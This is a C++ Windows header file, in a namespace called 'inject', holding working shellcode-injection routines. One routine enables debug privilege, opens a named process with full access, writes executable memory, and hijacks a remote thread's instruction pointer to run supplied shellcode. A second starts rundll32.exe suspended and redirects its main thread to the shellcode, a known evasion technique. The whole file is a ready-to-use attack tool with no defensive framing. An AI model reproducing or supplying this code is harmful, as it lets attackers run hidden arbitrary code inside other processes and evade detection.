/***
use this to create a process to run code
*/

#include <Windows.h>
#include <TlHelp32.h>

namespace inject
{
    inline u_int GetProcessId(const wchar_t *ProcessName)
    {
        PROCESSENTRY32W pt;
        HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hsnap) return 0;
        pt.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hsnap, &pt)) { // must call this first
            do {
                if (!lstrcmpiW(pt.szExeFile, ProcessName)) {
                    CloseHandle(hsnap);
                    return pt.th32ProcessID;
                }
            } while (Process32NextW(hsnap, &pt));
        }
        CloseHandle(hsnap);
        return 0;
    }

    inline u_int GetThreadId(u_int process_id)
    {
        THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap == INVALID_HANDLE_VALUE) return 0;

        u_int thread_id = 0;
        bool count = 0;
        if (Thread32First(hThreadSnap, &te32))
        {
            do {

                if (te32.th32OwnerProcessID == process_id)
                {
                    thread_id = te32.th32ThreadID;
                    CloseHandle(hThreadSnap);
                    return thread_id;
                }

            } while (Thread32Next(hThreadSnap, &te32));
        }

        CloseHandle(hThreadSnap);
        return thread_id;
    }

    static DWORD __stdcall RpcFunc(void* pData)
    {
        while (1)
        {
            Sleep(1 * 1000);
        }
        return 0;
    }

    inline bool EnableDebugPriv()
    {
        HANDLE   hToken;
        LUID   sedebugnameValue;
        TOKEN_PRIVILEGES   tkp;
        HANDLE   process;

        process = GetCurrentProcess();
        if (!process)
        {
            return false;
        }

        if (!OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        {
            CloseHandle(process);
            return false;
        }

        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
        {
            CloseHandle(process);
            CloseHandle(hToken);
            return false;
        }
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = sedebugnameValue;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
        {
            CloseHandle(process);
            CloseHandle(hToken);
            return false;
        }
        CloseHandle(process);
        CloseHandle(hToken);
        return true;
    }

    /**
    *inject shell code to specify process, note, win64 program can injected to win64 or win32 program, but win32 program can only injected to win32 program
    process_name(in): process exec name
    buf(in): shell code
    buf_size(in): buf size
    */
    inline int ShellCodeInject(const wchar_t *process_name, unsigned char *buf, size_t buf_size)
    {
        EnableDebugPriv();
        u_int process_id = GetProcessId(process_name);
        if (process_id == 0)
        {
            return -1;
        }

        HANDLE Process = OpenProcess(PROCESS_ALL_ACCESS, NULL, process_id);
        if (!Process)
        {
            return -1;
        }

        LPVOID pRmtFunc = VirtualAllocEx(Process, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (NULL == pRmtFunc)
        {
            return -1;
        }

        SIZE_T NumberOfBytesWritten = 0;
        if (!WriteProcessMemory(Process, pRmtFunc, RpcFunc, 4096, &NumberOfBytesWritten))
        {
            return -1;
        }

        HANDLE Thread = CreateRemoteThread(Process, NULL, 0, (LPTHREAD_START_ROUTINE)pRmtFunc, NULL, 0, 0);
        if (!Thread)
        {
            CloseHandle(Process);
            return -1;
        }

        bool success = false;
#ifdef _WIN64
        do
        {
            if (Wow64SuspendThread(Thread) == -1)
            {
                break;
            }
            WOW64_CONTEXT Context = { 0 };
            Context.ContextFlags = CONTEXT_ALL;
            if (!Wow64GetThreadContext(Thread, &Context))
            {
                break;
            }

            LPVOID Buffer = VirtualAllocEx(Process, NULL, buf_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (Buffer == NULL)
            {
                break;
            }

            SIZE_T NumberOfBytesWritten = 0;
            if (!WriteProcessMemory(Process, Buffer, buf, buf_size, &NumberOfBytesWritten))
            {
                break;
            }

            Context.Eip = (DWORD)Buffer;

            if (!Wow64SetThreadContext(Thread, &Context))
            {
                break;
            }

            while (1)
            {
                auto ret = ResumeThread(Thread);
                if (ret == -1)
                {
                    break;
                }
                if (ret != 0)
                {
                    continue;
                }
                break;
            }
            success = true;
        } while (0);
#endif

        if (!success)
        {
            do
            {
                if (SuspendThread(Thread) == -1)
                {
                    break;
                }
                CONTEXT Context = { 0 };
                Context.ContextFlags = CONTEXT_ALL;
                if (!GetThreadContext(Thread, &Context))
                {
                    break;
                }

                LPVOID Buffer = VirtualAllocEx(Process, NULL, buf_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (Buffer == NULL)
                {
                    break;
                }

                SIZE_T NumberOfBytesWritten = 0;
                if (!WriteProcessMemory(Process, Buffer, buf, buf_size, &NumberOfBytesWritten))
                {
                    break;
                }

#ifndef _WIN64
                Context.Eip = (size_t)Buffer;
#else
                Context.Rip = (size_t)Buffer;
#endif

                if (!SetThreadContext(Thread, &Context))
                {
                    break;
                }

                while (1)
                {
                    auto ret = ResumeThread(Thread);
                    if (ret == -1)
                    {
                        break;
                    }
                    if (ret != 0)
                    {
                        continue;
                    }
                    break;
                }
            } while (0);
        }

        CloseHandle(Thread);
        CloseHandle(Process);
        return 0;
    }

    /**
    *create rundll32.exe and run shell code
    buf(in): shell code
    buf_size: buf size
    */
    inline int ShellCodeInject(unsigned char *buf, size_t buf_size)
    {
        STARTUPINFO SI = { 0 };
        PROCESS_INFORMATION PI = { 0 };
        CONTEXT Context = { 0 };

        SI.cb = sizeof(SI);
        if (!CreateProcessA(NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        {
            return -1;
        }

        Context.ContextFlags = CONTEXT_ALL;
        if (!GetThreadContext(PI.hThread, &Context))
        {
            CloseHandle(PI.hThread);
            CloseHandle(PI.hProcess);
            return -1;
        }

        LPVOID Buffer = VirtualAllocEx(PI.hProcess, NULL, buf_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (Buffer == NULL)
        {
            CloseHandle(PI.hThread);
            CloseHandle(PI.hProcess);
            return -1;
        }

        SIZE_T NumberOfBytesWritten = 0;
        if (!WriteProcessMemory(PI.hProcess, Buffer, buf, buf_size, &NumberOfBytesWritten))
        {
            CloseHandle(PI.hThread);
            CloseHandle(PI.hProcess);
            return -1;
        }

#ifndef _WIN64
        Context.Eip = (size_t)Buffer;
#else
        Context.Rip = (size_t)Buffer;
#endif

        if (!SetThreadContext(PI.hThread, &Context))
        {
            CloseHandle(PI.hThread);
            CloseHandle(PI.hProcess);
            return -1;
        }

        ResumeThread(PI.hThread);
        CloseHandle(PI.hThread);
        CloseHandle(PI.hProcess);
        return 0;
    }
}